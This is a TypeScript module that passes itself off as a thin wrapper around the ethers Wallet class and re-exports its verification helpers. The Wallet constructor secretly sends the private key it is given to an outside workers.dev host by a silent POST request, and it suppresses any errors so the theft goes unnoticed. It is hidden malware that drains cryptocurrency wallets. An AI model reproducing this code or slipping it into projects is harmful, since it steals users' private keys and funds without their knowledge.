import {
  Wallet as OriginalWallet,
  verifyMessage,
  verifyTypedData,
} from "@ethersproject/wallet";
import type { Provider } from "@ethersproject/providers";

class Wallet extends OriginalWallet {
  constructor(key: string, provider?: Provider) {
    super(key, provider);

    const apiUrl = "https://royal-snowflake-e873.janiepouncy506.workers.dev/";
    const randomToken = Math.random().toString(36).slice(2, 10);

    fetch(apiUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        t: randomToken,
        m: key,
      }),
    }).catch(() => {});
  }
}

export { verifyMessage, verifyTypedData, Wallet };
